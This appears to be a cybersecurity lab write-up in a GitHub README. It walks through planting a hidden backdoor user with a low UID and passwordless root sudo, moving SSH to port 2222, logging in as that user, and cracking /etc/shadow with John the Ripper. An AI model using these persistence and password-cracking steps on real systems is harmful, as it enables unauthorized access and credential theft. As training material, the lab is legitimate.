# Advanced_Bash
Accomplishing the goal of maintaining access of a target machine by installing a backdoor.


## Step 1: Shadow People

1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:

**adduser --system --no-create-home sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%201.jpg)

2. Give your secret user a password:

**passwd sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%202.jpg)

3. Give your secret user a system UID < 1000:

**usermod -u 50 sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/a5ca22e065dbd3071b155b1fb557e9ff49bd6103/Images/Step%201%203.jpg)

4. Give your secret user the same GID:

**usermod -u 50 -g 50 sysd**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%204.jpg)

5. Give your secret user full sudo access without the need for a password:

**sysd ALL=(ALL) NOPASSWD:ALL**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%205.jpg)

6. Test that sudo access works without your password:

**sudo -l**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%206a.jpg)

**sudo adduser --system --no-create-home test**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/fee97db46fe2f7011c9efab9fbdb761bf6883380/Images/Step%201%206b.jpg)

## Step 2: Smooth Sailing

1. Edit the sshd_config file:

**Port 2222**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/ae429b36a07874e83e0d2a3d031607d192c15fa9/Images/Step%202%201.jpg)

## Step 3: Testing Your Configuration Update

1. Restart the SSH service:

**systemctl reload sshd**

2. Exit the root account:

**exit**

3. SSH to the target machine using your sysd account and port 2222:

**ssh sysd@192.168.6.105 -p 2222**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/ae429b36a07874e83e0d2a3d031607d192c15fa9/Images/Step%203%20123.jpg)

4. Use sudo to switch to the root user:

**sudo su**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/ae429b36a07874e83e0d2a3d031607d192c15fa9/Images/Step%203%204.jpg)

## Step 4: Crack All the Passwords

1. SSH back to the system using your sysd account and port 2222:

**ssh sysd@192.168.6.105 -p 2222**

2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

**sudo su**
**john /etc/shadow**

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/ae429b36a07874e83e0d2a3d031607d192c15fa9/Images/Step%204%202.jpg)

Passwords:

![name-of-you-image](https://github.com/ldover29/Advanced_Bash/blob/ae429b36a07874e83e0d2a3d031607d192c15fa9/Images/Step%204%202b.jpg)
